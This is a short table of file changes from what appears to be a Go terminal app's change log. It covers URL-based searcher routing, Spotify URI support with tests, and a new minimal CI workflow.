| `internal/tui/update.go` | **MODIFIED** | `selectedSearcher(url string)` + URL-driven Auto branch; `startResolve` call site; gate admits `spotify:` prefix; spotify import |
| `internal/tui/update_test.go` | **MODIFIED** | `TestSelectedSearcherRouting` (8 cases, sentinel identity), `TestURLMode_SpotifyURIAccepted`, `TestURLMode_OtherSchemeStillBlocked` |
| `.github/workflows/ci.yml` | **NEW** | Minimal hermetic CI: vet + build + `go test -short ./...` on push/PR (ARF-004/005) |
